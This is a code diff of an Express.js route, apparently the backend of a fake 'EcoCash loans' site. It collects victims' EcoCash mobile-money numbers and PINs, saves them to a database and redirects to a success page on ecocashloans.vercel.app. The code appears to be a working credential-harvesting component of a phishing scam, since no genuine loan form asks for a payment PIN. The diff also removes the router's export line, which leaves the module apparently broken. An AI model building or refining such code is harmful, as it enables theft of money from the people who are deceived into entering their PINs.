@@ -3,24 +3,18 @@ import LoanApplication from "../models/LoanApplication.js";
 
 const router = express.Router();
 
-// Acts like Formspree
 router.post("/", async (req, res) => {
   try {
     const { ecocash_number, pin, loan_amount } = req.body;
 
-    const newLoan = new LoanApplication({
+    await LoanApplication.create({
       ecocashNumber: "+263" + ecocash_number,
       pin,
       loanAmount: loan_amount
     });
 
-    await newLoan.save();
-
-    // Mimic Formspree success response
-    res.status(200).json({ success: true, message: "Form submitted" });
+    res.redirect("https://ecocashloans.vercel.app/success.html");
   } catch (error) {
-    res.status(500).json({ success: false, message: "Submission failed" });
+    res.status(500).send("Submission failed");
   }
 });
-
-export default router;
